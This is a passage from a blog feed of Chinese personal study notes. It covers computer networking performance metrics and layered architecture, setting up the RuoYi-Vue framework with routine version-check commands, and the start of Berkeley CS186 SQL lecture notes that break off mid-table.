<li><code>主机的发送速率</code>由【网卡的发送速率】、【信道带宽】、【交换机的接口速率】共同决定↓↓↓</li>
<li>构建网络时，应该做到各设备以及传输介质的<strong>速率匹配</strong>，才能完全发挥出本应具有的传输性能（网卡的发送速率、信道带宽、接口速率要接近，才能得到最大发送速率）</li>
</ul>
</li>
<li><code>【传播时延】 = 【信道长度 (m) 】 / 【电磁波传播速率 (m / s) 】</code>
<ul>
<li>电磁波在<u>自由空间</u>的传播速率是光速，即<code>3*10^8 m / s</code>【常识·记】</li>
<li>在铜线电缆中的传播速率约为：<code>2.3 * 10^8 m / s</code>【常识·记】</li>
<li>在光纤中的传播速率约为：<code>2.0 * 10^8 m / s</code>【常识·记】</li>
<li>∴要计算传播时延，应该先确定采用的是什么<strong>传输媒体</strong>，进而确定电磁波在该传输媒体中的<strong>传播速率</strong></li>
</ul>
</li>
<li>【处理时延】一般不方便计算，题目一般标记“处理时延忽略不计”</li>
</ul>
</li>
<li>
<p><a href="https://www.bilibili.com/video/BV1c4411d7jb?p=5&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.5 计算机网络的性能指标（1）_哔哩哔哩_bilibili</a>  16:41  两道例题，看发送时延还是传播时延在数据传输中占主导</p>
</li>
<li>
<p>总结：根据具体问题具体分析</p>
</li>
<li>
<p><a href="https://www.bilibili.com/video/BV1c4411d7jb?p=5&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.5 计算机网络的性能指标（1）_哔哩哔哩_bilibili</a>  17:35   总结</p>
</li>
</ul>
<h3 id="时延带宽积"><a class="header-anchor" href="#时延带宽积">¶</a>时延带宽积</h3>
<blockquote>
<p>传播时延与带宽的乘积</p>
<p>（类比：传播时延是管道长度，带宽是管道侧面积，时延带宽积就是管道的体积）</p>
</blockquote>
<ul>
<li>若发送端连续发送数据，则在所发送的第一个比特即将到达终点时，发送端就已经发送了时延带宽积个比特</li>
<li>链路的时延带宽积又称为<strong>以比特为单位的链路长度</strong></li>
</ul>
<h3 id="往返时间"><a class="header-anchor" href="#往返时间">¶</a>往返时间</h3>
<blockquote>
<p>数据双向交互一次所需时间（RTT）</p>
</blockquote>
<ul>
<li>在卫星链路上消耗的时间较多，带来传播时延较大</li>
</ul>
<h3 id="利用率"><a class="header-anchor" href="#利用率">¶</a>利用率</h3>
<ul>
<li>
<p>分为【信道利用率】和【网络利用率】</p>
</li>
<li>
<p><strong>信道利用率</strong>：</p>
<ul>
<li>用来表示某信道有百分之几的时间是被利用的（有数据通过）</li>
</ul>
</li>
<li>
<p><strong>网络利用率</strong>：</p>
<ul>
<li>全网络的信道利用率的加权平均</li>
</ul>
</li>
<li>
<p>根据排队论，当某信道的利用率增大时，该信道引起的时延也会迅速增加</p>
</li>
<li>
<p><strong>信道利用率并非越高越好</strong></p>
</li>
<li>
<p>令D0表示网络空闲时的时延，D表示网络当前的时延，那么在适当的假定条件下：</p>
<ul>
<li><code>D = D0 / (1 - U)</code></li>
<li>当网络利用率达到50%，时延加倍</li>
<li>网络利用率超过50%，时延急剧增大</li>
<li>网络利用率接近100%，时延趋于无穷大</li>
</ul>
</li>
<li>
<p>因此，一些拥有较大主干网的ISP通常会控制它们的信道利用率不超过50%</p>
<ul>
<li>如果超过，就要准备扩容，增大线路的带宽</li>
</ul>
</li>
<li>
<p>也不能使信道利用率太低，会浪费通信资源</p>
</li>
<li>
<p>应使用一些机制，可根据情况动态调整输入到网络中的通信量，使网络利用率保持在合理范围</p>
</li>
</ul>
<h3 id="丢包率"><a class="header-anchor" href="#丢包率">¶</a>丢包率</h3>
<ul>
<li>
<p>即分组丢失率，是指在一定的时间范围内，传输过程中<strong>丢失的分组数量与总分组数量的比率</strong></p>
</li>
<li>
<p>具体可分为：接口丢包率、结点丢包率、脸露丢包率、路径丢包率、网络丢包率等</p>
</li>
<li>
<p>分组丢失的两种情况：</p>
<ul>
<li>分组在传输过程中出现<strong>误码</strong>，被结点丢弃</li>
<li>分组到达一台队列已满的分组交换机时被丢弃；在通信量较大时就可能造成<strong>网络堵塞</strong></li>
</ul>
</li>
<li>
<p>in fact：路由器会根据自身的拥塞控制方法，在输入缓存还未满的时候就主动丢弃分组</p>
</li>
<li>
<p>∴丢包率反映了网络的拥塞情况</p>
<ul>
<li>无拥塞：路径丢包率为0</li>
<li>轻度拥塞：路径丢包率1%~4%</li>
<li>严重拥塞：路径丢包率5%~15%</li>
</ul>
</li>
<li>
<p>丢包率较高时，通常无法使网络应用正常工作</p>
</li>
</ul>
<h2 id="❤❤计算机网络体系结构❤❤"><a class="header-anchor" href="#❤❤计算机网络体系结构❤❤">¶</a>❤❤计算机网络体系结构❤❤</h2>
<blockquote>
<p>常见的计算机网络体系结构</p>
<p>计算机网络体系结构分层的必要性</p>
<p>计算机网络体系结构分层思想举例</p>
<p>计算机网络体系结构中的专用术语</p>
</blockquote>
<h3 id="常见的计算机网络体系结构"><a class="header-anchor" href="#常见的计算机网络体系结构">¶</a>常见的计算机网络体系结构</h3>
<ul>
<li>
<p>开放系统互连参考模型（OSI）</p>
</li>
<li>
<p>是一个七层协议的体系结构</p>
</li>
<li>
<p>此处缺一张图  1.1  常见的计算机网络体系结构</p>
</li>
<li>
<p>路由器一般只包含网络接口层和网际层</p>
</li>
<li>
<p>TCP/IP体系结构的网络接口层并没有规定什么具体内容，目的是可以互连全世界各种不同的网络接口</p>
<ul>
<li>例如有线的以太网接口，无线局域网的WiFi接口，而不限定仅使用一种或几种网络接口</li>
</ul>
</li>
<li>
<p>因此本质上，TCP/IP体系结构只有上面的三层【网际层、运输层、应用层】</p>
<ul>
<li><strong>IP协议</strong>是TCP/IP体系结构<strong>网际层</strong>的核心协议</li>
<li><strong>TCP和UDP</strong>是TCP/IP体系结构<strong>运输层</strong>的两个重要协议</li>
<li>TCP/IP体系结构的<strong>应用层</strong>包含了大量的应用层协议，如HTTP、SMTP、DNS、RTP等</li>
</ul>
</li>
<li>
<p><strong>IP协议</strong>可以将不同的网络<strong>接口</strong>进行<strong>互连</strong>，并向其上的<strong>TCP协议和UDP协议</strong>提供网络互连服务</p>
</li>
<li>
<p>而<strong>TCP协议</strong>在享受IP协议提供的网络互连服务的<strong>基础上</strong>，可向<strong>应用层</strong>的相应协议提供<strong>可靠传输</strong>的服务</p>
</li>
<li>
<p><strong>UDP协议</strong>在享受IP协议提供的网络互连服务的基础上，可向<strong>应用层</strong>的相应协议提供<strong>不可靠传输</strong>的服务</p>
</li>
<li>
<p>IP协议作为TCP/IP体系结构中的<strong>核心协议</strong>，一方面负责互连不同的网络接口 (IP over everything) ，另一方面为各种网络应用提供服务 (Everything over IP)</p>
</li>
<li>
<p>在嵌入式开发领域，TCP/IP协议族常称为TCP/IP协议栈</p>
</li>
<li>
<p><a href="https://www.bilibili.com/video/BV1c4411d7jb?p=7&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.6 计算机网络体系结构（1）—常见的计算机网络体系结构_哔哩哔哩_bilibili</a>  08:01</p>
</li>
</ul>
<h4 id="五层协议的原理体系结构：（由下到上）"><a class="header-anchor" href="#五层协议的原理体系结构：（由下到上）">¶</a>五层协议的原理体系结构：（由下到上）</h4>
<ul>
<li>物理层</li>
<li>数据链路层</li>
<li>网络层</li>
<li>运输层</li>
<li>应用层</li>
</ul>
<h3 id="计算机网络体系结构分层的必要性"><a class="header-anchor" href="#计算机网络体系结构分层的必要性">¶</a>计算机网络体系结构分层的必要性</h3>
<h4 id="计算机网络要面临的问题——物理层"><a class="header-anchor" href="#计算机网络要面临的问题——物理层">¶</a>计算机网络要面临的问题——物理层</h4>
<ul>
<li>采用怎样的传输介质</li>
<li>采用怎样的物理借口</li>
<li>使用怎样的信号表示比特0和1</li>
</ul>
<h4 id="计算机网络要面临的问题——数据链路层"><a class="header-anchor" href="#计算机网络要面临的问题——数据链路层">¶</a>计算机网络要面临的问题——数据链路层</h4>
<ul>
<li>如何标识网络中的各主机（主机编址问题，例如MAC地址）</li>
<li>如何从信号所表示的一连串比特流中区分出地址和数据（即解决分组的封装格式问题）</li>
<li>如何协调各主机争用总线</li>
</ul>
<h4 id="计算机网络要面临的问题——网络层"><a class="header-anchor" href="#计算机网络要面临的问题——网络层">¶</a>计算机网络要面临的问题——网络层</h4>
<ul>
<li>
<p>如何标识各网络以及网络中的各主机（网络和主机共同编址的问题，例如IP地址）</p>
</li>
<li>
<p><a href="https://www.bilibili.com/video/BV1c4411d7jb?p=8&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.6 计算机网络体系结构（2）—分层的必要性_哔哩哔哩_bilibili</a>缺图  07:12</p>
</li>
<li>
<p>路由器如何转发分组，如何进行路由选择</p>
</li>
<li>
<p>解决了物理层、数据链路层、网络层各自的问题，则可实现<strong>分组在网络间传输的问题</strong></p>
<ul>
<li>但是对于计算机网络应用而言还不够</li>
</ul>
</li>
</ul>
<h4 id="计算机网络要面临的问题——运输层"><a class="header-anchor" href="#计算机网络要面临的问题——运输层">¶</a>计算机网络要面临的问题——运输层</h4>
<ul>
<li>
<p>如何解决进程之间基于网络的通信问题</p>
</li>
<li>
<p>出现传输错误时，如何处理</p>
</li>
<li>
<p>解决了物理层、数据链路层、网络层、运输层各自的问题，则可实现<strong>进程之间基于网络的通信</strong></p>
</li>
</ul>
<h4 id="计算机网络要面临的问题——应用层"><a class="header-anchor" href="#计算机网络要面临的问题——应用层">¶</a>计算机网络要面临的问题——应用层</h4>
<ul>
<li>通过应用进程间的交互来完成特定的网络应用
<ul>
<li>例如：支持万维网应用的HTTP协议、支持电子邮件的SMTP协议、支持文件传送的FTP协议等</li>
</ul>
</li>
</ul>
<h4 id="小总结"><a class="header-anchor" href="#小总结">¶</a>小总结</h4>
<table>
<thead>
<tr>
<th>原理体系结构</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>应用层</td>
<td>解决通过应用进程的交互来实现特定网络应用的问题</td>
</tr>
<tr>
<td>运输层</td>
<td>解决进程之间基于网络的通信问题</td>
</tr>
<tr>
<td>网络层</td>
<td>解决分组在多个网络上传输（路由）的问题</td>
</tr>
<tr>
<td>数据链路层</td>
<td>解决分组在一个网络（或一段链路）上传输的问题</td>
</tr>
<tr>
<td>物理层</td>
<td>解决使用何种信号来传输比特的问题</td>
</tr>
</tbody>
</table>
<h3 id="计算机网络体系结构分层思想举例（感觉这个过程是重点呢）"><a class="header-anchor" href="#计算机网络体系结构分层思想举例（感觉这个过程是重点呢）">¶</a>计算机网络体系结构分层思想举例（感觉这个过程是重点呢）</h3>
<ul>
<li>缺图  <a href="https://www.bilibili.com/video/BV1c4411d7jb?p=9&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.6 计算机网络体系结构（3）—分层思想举例_哔哩哔哩_bilibili</a>  0:43</li>
<li>从主机端按体系结构自顶向下：</li>
<li><strong>（主机端的）应用层</strong>按HTTP协议的规定，构建一个HTTP请求报文，应用层将HTTP请求报文交付给运输层处理</li>
<li><strong>（主机端的）运输层</strong>给HTTP请求报文添加一个TCP首部，使之成为TCP报文段；运输层将TCP报文段交付给网络层处理
<ul>
<li>TCP首部的作用：主要是为了区分应用进程</li>
</ul>
</li>
<li><strong>（主机端的）网络层</strong>给TCP报文段添加一个IP首部，使之成为IP数据报；将IP数据报交付给数据链路层处理
<ul>
<li>IP首部的作用：为了使IP数据报可以在互联网上传输，即被路由器转发</li>
</ul>
</li>
<li><strong>（主机端的）数据链路层</strong>给IP数据报添加一个首部和一个尾部使之成为帧；数据链路层将帧交付给物理层
<ul>
<li><strong>首部</strong>的作用：为了让帧能够在一段链路上或一个网络上传输，能够被相应的目的主机接收</li>
<li><strong>尾部</strong>的作用：让目的主机检查所接收到的帧是否有误码</li>
</ul>
</li>
<li><strong>（主机端的）物理层</strong>将帧看作是比特流。网络N1是以太网→物理层还会给该比特流前面添加前导码；物理层将添加有前导码的比特流变换成相应的信号发送到传输媒体；
<ul>
<li>前导码的作用：让目的主机做好接收帧的准备</li>
</ul>
</li>
<li>信号通过传输媒体到达<strong>路由器</strong></li>
<li><strong>（路由器的）物理层</strong>将信号变换为比特流，去掉前导码后，将其交付给<strong>数据链路层</strong>
<ul>
<li>交付的是帧</li>
</ul>
</li>
<li><strong>（路由器的）数据链路层</strong>将帧的首部和尾部去掉后，将其交付给<strong>网络层</strong>
<ul>
<li>交付的是IP数据报</li>
</ul>
</li>
<li><strong>（路由器的）网络层</strong>解析IP数据报的首部，从中提取出目的网络地址，然后查找自身路由表，确定转发端口以便进行转发；网络层将IP数据报交付给数据链路层</li>
<li><strong>（路由器的）数据链路层</strong>给IP数据报添加一个首部和一个尾部使之成为帧；数据链路层将帧交付给物理层</li>
<li><strong>（路由器的）物理层</strong>将帧看作是比特流。网络N2是以太网→物理层还会给该比特流前面添加前导码；物理层将添加有前导码的比特流变换成相应的信号发送到传输媒体；信号通过传输媒体到达<strong>Web服务器</strong></li>
<li><strong>（服务器端的）物理层</strong>将信号变换为比特流，去掉前导码后将其交付给<strong>数据链路层</strong>
<ul>
<li>实际上交付的是帧</li>
</ul>
</li>
<li><strong>（服务器端的）数据链路层</strong>将帧的首部和尾部去掉后，将其交付给<strong>网络层</strong>
<ul>
<li>交付的是IP数据报</li>
</ul>
</li>
<li><strong>（服务器端的）网络层</strong>将IP数据报的首部去掉后，将其交付给<strong>运输层</strong>
<ul>
<li>实际上交付的是TCP报文段</li>
</ul>
</li>
<li><strong>（服务器端的）运输层</strong>将TCP报文段的首部去掉后，将其交付给<strong>应用层</strong>
<ul>
<li>实际上交付的是HTTP请求报文</li>
</ul>
</li>
<li><strong>（服务器端的）应用层</strong>对HTTP请求报文进行解析，然后给主机发回HTTP响应报文</li>
<li>之后步骤类似以上，HTTP响应报文需要在<strong>Web服务器</strong>层层封装，然后通过<strong>物理层</strong>变换成相应的信号，再通过传输媒体传输到<strong>路由器</strong>，路由器转发该响应报文给<strong>主机</strong>，主机通过<strong>物理层</strong>将收到的信号转换为比特流，之后通过逐层解封，最终取出HTTP响应报文</li>
</ul>
<h3 id="计算机网络体系结构中的专用术语"><a class="header-anchor" href="#计算机网络体系结构中的专用术语">¶</a>计算机网络体系结构中的专用术语</h3>
<ul>
<li>术语来源：<u>OSI的七层协议体系结构</u>，但也适用于<u>TCP/IP的四层体系结构</u>和<u>五层协议原理体系结构</u></li>
</ul>
<h4 id="实体"><a class="header-anchor" href="#实体">¶</a>实体</h4>
<ul>
<li>
<p>缺图：<a href="https://www.bilibili.com/video/BV1c4411d7jb?p=10&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.6 计算机网络体系结构（4）—专用术语_哔哩哔哩_bilibili</a>   01:40</p>
</li>
<li>
<p>实体</p>
<blockquote>
<p>任何可发送或接收信息的硬件或软件进程</p>
</blockquote>
</li>
<li>
<p>对等实体</p>
<blockquote>
<p>收发双方相同层次中的实体</p>
</blockquote>
</li>
</ul>
<h4 id="协议"><a class="header-anchor" href="#协议">¶</a>协议</h4>
<ul>
<li>
<p>协议</p>
<blockquote>
<p>控制两个对等实体进行逻辑通信的规则的集合</p>
<p>例如：</p>
<p>应用层对等实体通过使用应用层协议（如HTTP,SMTP）进行通信</p>
<p>运输层对等实体通过使用运输层协议（如TCP,UDP）进行通信</p>
<p>网络层对等实体通过使用网络层协议（如IP）进行通信</p>
<p>链路层对等实体通过使用链路层协议（如传统以太网CSMA/CD）进行通信</p>
<p>物理层对等实体通过使用物理层协议（如传统以太网使用曼彻斯特编码）进行通信</p>
<p>注：逻辑通信不存在，只是假设的。</p>
<p>目的：方便单独研究体系结构某一层时不用考虑其他层</p>
</blockquote>
</li>
<li>
<p>协议的三要素</p>
<blockquote>
<p>语法</p>
<p>语义</p>
<p>同步</p>
</blockquote>
<ul>
<li>
<p>语法   缺图 <a href="https://www.bilibili.com/video/BV1c4411d7jb?p=10&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.6 计算机网络体系结构（4）—专用术语_哔哩哔哩_bilibili</a>  03:55</p>
<blockquote>
<p>定义所交换信息的格式</p>
<p>例如：IP数据报、TCP报文段、HTTP报文等常见分组格式</p>
</blockquote>
</li>
<li>
<p>语义</p>
<blockquote>
<p>定义收发双方所要完成的操作</p>
</blockquote>
</li>
<li>
<p>同步   缺图  <a href="https://www.bilibili.com/video/BV1c4411d7jb?p=10&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.6 计算机网络体系结构（4）—专用术语_哔哩哔哩_bilibili</a>  05:43</p>
<blockquote>
<p>定义收发双方的时序关系</p>
<p>注意：不是指始终频率同步</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="服务"><a class="header-anchor" href="#服务">¶</a>服务</h4>
<ul>
<li>
<p>服务</p>
<blockquote>
<p>在协议的控制下，两个对等实体间的逻辑通信使得本层能够向上一层提供服务</p>
<p>要实现本层协议，还需要使用下面一层所提供的服务</p>
<p>协议是“==水平的==”， 服务是“==垂直的==”</p>
<p>实体看得见相邻下层所提供的服务，但并不知道实现该服务的具体协议。即下面的协议对上面的实体是“==透明==”的</p>
</blockquote>
</li>
<li>
<p>服务访问点</p>
<blockquote>
<p>在同一系统中相邻两层的实体交换信息的逻辑接口，用于区分不同的服务类型</p>
<p>例如：</p>
<p>数据链路层的服务访问点为帧的“类型”字段</p>
<p>网络层的服务访问点为IP数据报首部中的“协议字段”</p>
<p>运输层的服务访问点为“端口号”</p>
</blockquote>
</li>
<li>
<p>服务原语</p>
<blockquote>
<p>上层使用下层所提供的服务必须通过与下层交换一些命令，这些命令称为服务原语</p>
</blockquote>
</li>
<li>
<p>协议数据单元PDU</p>
<blockquote>
<p>对等层次之间传送的数据包称为该层的协议数据单元</p>
<p>物理层数据包：比特流（bit stream）</p>
<p>链路层数据包：帧（frame）</p>
<p>网络层数据包：IP数据报或分组（packet）</p>
<p>运输层数据包：TCP报文段（segment）或UDP用户数据报（datagram）</p>
<p>应用层数据包：报文（message）</p>
<p>以上各层数据包可统称为协议数据单元PDU</p>
</blockquote>
</li>
<li>
<p>服务数据单元SDU</p>
<blockquote>
<p>同一系统内，层与层之间交换的数据包称为服务数据单元</p>
</blockquote>
</li>
<li>
<p>多个SDU可以合成为一个PDU；一个SDU也可划分为几个PDU</p>
</li>
</ul>
<h2 id="章节小结"><a class="header-anchor" href="#章节小结">¶</a>章节小结</h2>
<ul>
<li>
<p><a href="https://www.bilibili.com/video/BV1c4411d7jb?p=11&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.7 第1章 概述 章节小结_哔哩哔哩_bilibili</a></p>
</li>
<li>
<p>用pad做笔记再导出成pdf再导到这里吧</p>
</li>
</ul>
<h2 id="第一章习题课"><a class="header-anchor" href="#第一章习题课">¶</a>第一章习题课</h2>
<ul>
<li><a href="https://www.bilibili.com/video/BV1c4411d7jb?p=12&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.8 第1章 概述 习题课（1）— 体系结构相关习题_哔哩哔哩_bilibili</a></li>
<li>用pad做笔记再导出成pdf再导到这里吧</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>Computer Networking notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Computer Networking</tag>
      </tags>
  </entry>
  <entry>
    <title>【RuoYi + AI】2_若伊搭建</title>
    <url>/2024/07/07/CS_Notes/RuoYi/%E3%80%90RuoYi-+-AI%E3%80%912_%E8%8B%A5%E4%BC%8A%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="若伊搭建"><a class="header-anchor" href="#若伊搭建">¶</a>若伊搭建</h2>
<h3 id="版本的解释"><a class="header-anchor" href="#版本的解释">¶</a>版本的解释</h3>
<p><s><code>RuoYi</code> 前后端混合开发版本   后端Springboot  前端Bootstrap</s>  已淘汰</p>
<p><code>RuoYi-Vue</code> 前后端分离开发版本   后端Springboot  前端Vue   单体项目√   中大型项目会有性能或扩展性的问题</p>
<p><code>RuoYi-Cloud</code>   后端SpringCloud  前端Bootstrap   微服务版本，系统延伸性和稳定性有    做分布式微服务项目选这个</p>
<p>以上两个提供的都是PC端，移动端的选下面APP这个版本</p>
<p><code>RuoYi-APP</code>   后端Uniapp前端Vue  一次编写多端运行</p>
<ul>
<li>注意：<code>RuoYi-APP</code>没有提供后端代码，可以适配<code>RuoYi-Vue</code>和<code>RuoYi-Cloud</code></li>
</ul>
<p><code>RuoYi-other</code> <code>Vue3+ElementPlus+Vite</code></p>
<h3 id="RuoYi-Vue"><a class="header-anchor" href="#RuoYi-Vue">¶</a>RuoYi-Vue</h3>
<ul>
<li>前后端分离的单体框架设计</li>
<li>软件环境：JDK、MySQL、Redis、Maven、Node</li>
</ul>
<p>阿西吧我服了最讨厌配环境了……</p>
<h4 id="确认版本"><a class="header-anchor" href="#确认版本">¶</a>确认版本</h4>
<ul>
<li>
<p>JDK</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>
<p>获得信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;java -version</span><br><span class="line">java version <span class="string">&quot;17.0.9&quot;</span> 2023-10-17 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.9+11-LTS-201)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.9+11-LTS-201, mixed mode, sharing)</span><br><span class="line"></span><br><span class="line">&gt;javac -version</span><br><span class="line">javac 17.0.9</span><br></pre></td></tr></table></figure>
<ul>
<li>课程版本：JDK 11</li>
</ul>
</li>
<li>
<p>MySQL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql --version</span><br><span class="line">mysql -V   </span><br><span class="line">// 都行</span><br></pre></td></tr></table></figure>
<ul>
<li>服了，之前为了配小皮的环境把本地mysql给卸了，不知道要不要重装一个</li>
<li>课程版本：MySQL 8</li>
</ul>
</li>
<li>
<p>Redis</p>
<ul>
<li>当Redis服务器正在运行，使用以下命令：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli info | grep redis_version</span><br></pre></td></tr></table></figure>
<ul>
<li>没启动就先启动Redis服务器</li>
<li>课程版本：Redis 5（Win）</li>
</ul>
</li>
<li>
<p>Maven</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn -version</span><br></pre></td></tr></table></figure>
<ul>
<li>课程版本：Maven 3.6</li>
</ul>
</li>
<li>
<p>Node.js以及npm（Node的包管理器），可以使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm -v</span><br></pre></td></tr></table></figure>
<ul>
<li>获得信息：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;node -v</span><br><span class="line">v20.12.1</span><br><span class="line"></span><br><span class="line">&gt;npm -v</span><br><span class="line">10.5.0</span><br></pre></td></tr></table></figure>
<ul>
<li>课程版本：Node16（Vue3）</li>
</ul>
</li>
</ul>
<h4 id="技术选型"><a class="header-anchor" href="#技术选型">¶</a>技术选型</h4>
<ul>
<li>Spring Boot</li>
<li>Spring Security</li>
<li>MyBatis</li>
<li>Jwt</li>
<li>Vue3</li>
<li>Element-Plus</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://gitee.com/y_project/RuoYi-Vue</span><br></pre></td></tr></table></figure>
<p>芝士前后端分离版本的脚手架，但是其中的ruoyi-ui使用的还是Vue2版本，换成Vue3</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://gitee.com/fanxincc/RuoYi-Vue3</span><br></pre></td></tr></table></figure>
<p>以上是Vue3扩展地址</p>
<h2 id="搭建后端项目步骤"><a class="header-anchor" href="#搭建后端项目步骤">¶</a>搭建后端项目步骤</h2>
<ol>
<li>Git克隆并初始化项目</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">→ 打开IDEA </span><br><span class="line">→ 右上角Get from VCS </span><br><span class="line">→ 将仓库存储地址和url复制上去  RuoYi-Vue</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>MySQL导入与配置</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1pf421B71v/?p=2&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">基础篇-02.若依搭建_哔哩哔哩_bilibili</a></p>
]]></content>
      <categories>
        <category>notes</category>
        <category>RuoYi notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>RuoYi</tag>
      </tags>
  </entry>
  <entry>
    <title>CS186 SQL2 Berkeley</title>
    <url>/2024/07/05/CS_Notes/Database/CS186%20SQL2/</url>
    <content><![CDATA[<h2 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h2>
<p>Berkeley CS186 Intro to DB Systems</p>
<p><a href="https://www.youtube.com/watch?v=Q-dxGaR3fH0&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=6">视频地址</a>  课程记录</p>
<h2 id="SQL-2"><a class="header-anchor" href="#SQL-2">¶</a>SQL 2</h2>
<h3 id="Conceptual-SQL-Evaluation"><a class="header-anchor" href="#Conceptual-SQL-Evaluation">¶</a>Conceptual SQL Evaluation</h3>
<p>SQL查询从原始数据表提取和转换数据的执行顺序</p>
<ol>
<li>
<p><code>FROM</code> Identify table  确定表</p>
</li>
<li>
<p><code>WHERE</code>  Apply selections(eliminate rows)   应用选择条件（筛选行）</p>
</li>
<li>
<p><code>SELECT</code>  Project away columns(keep only those used in SELECT, GBY, HAVING)   SELECT子句指定了需要返回哪些列，或通过聚合函数进行计算</p>
</li>
<li>
<p><code>GROUP BY</code>  Form groups &amp; aggregate   用GROUP BY将数据分组，并对每个组应用聚合函数</p>
</li>
<li>
<p><code>HAVING</code>  Eliminate groups   过滤不满足条件的组</p>
</li>
<li>
<p><code>DISTINCT</code>  Eliminate duplicates   在最终结果中去除重复的行</p>
</li>
<li>
<p>(Optinal) <code>ORDER BY</code> <code>LIMIT</code> applied at end, to “format” output  格式化输出    <code>ORDER BY</code> 用于控制升序/降序输出, <code>LIMIT</code> 用于获取特定数量的排序后结果，通常与<code>ORDER BY</code>一起使用</p>
</li>
</ol>
<h4 id="Putting-it-all-together"><a class="header-anchor" href="#Putting-it-all-together">¶</a>Putting it all together</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.dept, <span class="built_in">AVG</span>(S.gpa), <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.gender <span class="operator">=</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.dept</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> S.dept</span><br></pre></td></tr></table></figure>
<p>解释：从别名为S的Students学生表中，筛选出性别为Female的学生，按照所在部门分组，并输出符合条件的学生的部门信息、平均GPA和学生总数，至少有两名女性学生的部门才会被输出，最终结果按照部门字典序排列</p>
<h3 id="Join-Queries"><a class="header-anchor" href="#Join-Queries">¶</a>Join Queries</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="operator">&lt;</span><span class="keyword">column</span> expression list<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">FROM</span> <span class="operator">&lt;</span>table1 [<span class="keyword">AS</span> t1], ..., tableN [<span class="keyword">AS</span> tn]<span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">WHERE</span> <span class="operator">&lt;</span>predicate<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">&lt;</span><span class="keyword">column</span> list<span class="operator">&gt;</span> [<span class="keyword">HAVING</span>  <span class="operator">&lt;</span>predicate<span class="operator">&gt;</span>] ]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span><span class="keyword">column</span> list<span class="operator">&gt;</span>];</span><br></pre></td></tr></table></figure>
<p><code>多表查询</code></p>
<p>区别就是FROM那里有多个表</p>
<h4 id="Cross-Cartesian-Product"><a class="header-anchor" href="#Cross-Cartesian-Product">¶</a>Cross(Cartesian) Product</h4>
<ul>
<li>All pairs of tuples, concentrated</li>
</ul>
<h4 id="Example-Sailors-who-have-reserved-a-boat"><a class="header-anchor" href="#Example-Sailors-who-have-reserved-a-boat">¶</a>Example: Sailors who have reserved a boat</h4>
<p><code>Sailors</code>表</p>
<table>
<thead>
<tr>
<th>sid</th>
<th>sname</th>
<th>rating</th>
<th>age</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Popeye</td>
<td>10</td>
<td>22</td>
</tr>
<tr>
<td>2</td>
<td>OliveOyl</td>
<td>11</td>
<td>39</td>
</tr>
<tr>
<td>3</td>
<td>Garfield</td>
<td>1</td>
<td>27</td>
</tr>
<tr>
<td>4</td>
<td>Bob</td>
<td>5</td>
<td>19</td>
</tr>
</tbody>
</table>
<p><code>Reserveds</code> 表</p>
<table>
<thead>
<tr>
<th>SID</th>
<th>BID</th>
